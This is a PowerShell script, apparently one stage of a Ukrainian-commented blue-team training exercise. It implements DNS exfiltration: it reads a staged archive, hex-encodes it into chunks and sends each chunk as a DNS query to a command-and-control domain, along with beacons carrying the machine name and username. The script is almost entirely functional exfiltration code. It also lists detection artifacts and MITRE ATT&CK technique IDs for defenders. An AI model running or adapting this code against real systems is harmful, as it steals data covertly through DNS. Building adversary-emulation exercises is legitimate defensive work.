# =============================================================================
# Block 5: DNS C2 & Exfiltration
# для навчання — заборонено використовувати поза навчальним середовищем
# EXERCISE ONLY — Blue Team Training
# =============================================================================
# Що робить:
#   Читає архів з block4, розбиває на шматки по 40 байт,
#   кодує кожен у Base64 і відправляє як DNS-запит до C2 сервера.
#   C2 сервер логує запити → відновлює файл по шматках.
#
# Схема DNS-запиту:
#   <seq>.<base64_chunk>.exfil.updates-gov.net
#   Наприклад:
#   0001.aGVsbG8gd29ybGQ.exfil.updates-gov.net
#   0002.xT2NyZXQgZGF0YQ.exfil.updates-gov.net
#
# Артефакти для blue team:
#   - Arkime/Zeek : сотні DNS-запитів до одного домену (DNS exfil pattern)
#   - Wazuh       : anomaly — DNS query flood
#   - Sysmon EID 22 : DNS Query events
#
# MITRE ATT&CK:
#   T1048.003 — Exfiltration Over Alternative Protocol: DNS
#   T1071.004 — Application Layer Protocol: DNS
# =============================================================================

param(
    [int]$ChunkSize = 30,
    [int]$DelayMs   = 10
)

$BLOCK_TAG = "B5"
$LogPath   = "C:\ProgramData\upd_logs\block5.log"
. "$PSScriptRoot\config.ps1"

# ── DNS Exfiltration: відправити один шматок ──────────────────────────────────

function Send-DnsChunk {
    param(
        [int]   $Seq,       # порядковий номер шматка
        [string]$Chunk,     # base64-encoded дані
        [int]   $Total      # загальна кількість шматків
    )
    # DNS label обмежений 63 символами — обрізаємо ДО побудови query
    if ($Chunk.Length -gt 60) { $Chunk = $Chunk.Substring(0, 60) }

    # Формат: <seq_4digits>.<chunk>.exfil.<domain>
    $seq_str = "{0:D4}" -f $Seq
    $query   = "$seq_str.$Chunk.exfil.$C2_DOMAIN"

    Resolve-DnsName $query -Type A -ErrorAction SilentlyContinue | Out-Null

    if ($Seq % 10 -eq 0) {
        Write-Log "Exfil progress: $Seq/$Total chunks sent"
    }
}

# =============================================================================

Write-Log "=== BLOCK 5: DNS EXFILTRATION START ==="
Invoke-DnsBeacon -Label "B5:START:$env:COMPUTERNAME"

$LOG_DIR = "C:\ProgramData\upd_logs"

# ── Знайти архів з block4 ─────────────────────────────────────────────────────

$stage_path_file = "$LOG_DIR\stage_path.txt"

if (Test-Path $stage_path_file) {
    $ARCHIVE_PATH = (Get-Content $stage_path_file -Raw).Trim()
    Write-Log "Archive path from block4: $ARCHIVE_PATH"
} else {
    # Якщо файл не знайдено — шукаємо WinUpd_*.zip в %TEMP%
    $ARCHIVE_PATH = Get-ChildItem "C:\ProgramData\WinUpd_*.zip" |
        Sort-Object LastWriteTime -Descending |
        Select-Object -First 1 -ExpandProperty FullName
    Write-Log "Archive path (auto-detected): $ARCHIVE_PATH"
}

if (-not (Test-Path $ARCHIVE_PATH)) {
    Write-Log "Архів не знайдено! Запусти block4 спочатку." -Level "ERROR"
    Invoke-DnsBeacon -Label "B5:ERROR:NO_ARCHIVE"
    exit
}

$archive_size = (Get-Item $ARCHIVE_PATH).Length
Write-Log "Archive: $ARCHIVE_PATH ($archive_size bytes)"

# ── Перевірка доступності C2 (TCP/53 або ICMP) ───────────────────────────────
# Якщо C2 недоступний — DNS запити будуть таймаутитись хвилинами.
# Пропускаємо exfil але логуємо факт спроби (артефакт для blue team).

Write-Log "Checking C2 reachability via DNS: $C2_DOMAIN ..."
$c2_reachable = $null -ne (Resolve-DnsName "ping.$C2_DOMAIN" -Type A -ErrorAction SilentlyContinue)

if (-not $c2_reachable) {
    Write-Log "C2 $C2_DOMAIN недоступний — exfiltration відкладено" -Level "WARN"
    Write-Log "Archive готовий до відправки: $ARCHIVE_PATH"
    Write-Log "=== BLOCK 5: SKIPPED (C2 unreachable) ==="
    exit
}

Write-Log "C2 reachable — starting exfiltration"

# ── Читаємо архів як байти → Base64 ──────────────────────────────────────────

Write-Log "Reading archive and encoding..."
$bytes = [System.IO.File]::ReadAllBytes($ARCHIVE_PATH)

# Hex кодування: 0-9 a-f — жодних колізій з DNS або base64 символами
# 30 байт → 60 hex символів (безпечно під ліміт DNS label 63)
$CHUNK_BYTES = 30

Write-Log "Archive size: $($bytes.Length) bytes"

# ── Розбиваємо на шматки ──────────────────────────────────────────────────────

$chunks = @()
for ($i = 0; $i -lt $bytes.Length; $i += $CHUNK_BYTES) {
    $end    = [Math]::Min($i + $CHUNK_BYTES, $bytes.Length)
    $slice  = $bytes[$i..($end - 1)]
    $chunks += [BitConverter]::ToString($slice).Replace("-", "").ToLower()
}

$total = $chunks.Count
Write-Log "Split into $total chunks (ChunkSize=$ChunkSize)"
Invoke-DnsBeacon -Label "B5:EXFIL:START:${total}chunks"

# ── Beacon: початок передачі ──────────────────────────────────────────────────
# Спочатку надсилаємо метадані про файл
$meta     = "META:$env:COMPUTERNAME:$env:USERNAME:${total}:${archive_size}"
$meta_hex = [BitConverter]::ToString(
    [Text.Encoding]::UTF8.GetBytes($meta)
).Replace("-", "").ToLower()
Resolve-DnsName "0000.$meta_hex.exfil.$C2_DOMAIN" -Type A -ErrorAction SilentlyContinue | Out-Null
Write-Log "Metadata beacon sent"

# ── Відправляємо шматки ───────────────────────────────────────────────────────

$start_time = Get-Date

for ($i = 0; $i -lt $chunks.Count; $i++) {
    Send-DnsChunk -Seq ($i + 1) -Chunk $chunks[$i] -Total $total

    if ($DelayMs -gt 0) {
        Start-Sleep -Milliseconds $DelayMs
    }
}

$elapsed = ((Get-Date) - $start_time).TotalSeconds

# ── Beacon: завершення передачі ───────────────────────────────────────────────
$end_label = "B5:EXFIL:DONE:${total}chunks:${elapsed}s"
Invoke-DnsBeacon -Label $end_label

Write-Log "Exfiltration complete: $total chunks in $([Math]::Round($elapsed,1)) sec"
Write-Log "Effective rate: $([Math]::Round($archive_size / $elapsed, 0)) bytes/sec"

# ── Опціонально: видалити архів після відправки ───────────────────────────────
# (коментар — для навчання залишаємо артефакт на диску)
# Remove-Item $ARCHIVE_PATH -Force

Write-Log "=== BLOCK 5: COMPLETE ==="
Invoke-DnsBeacon -Label "B5:DONE:$env:COMPUTERNAME"
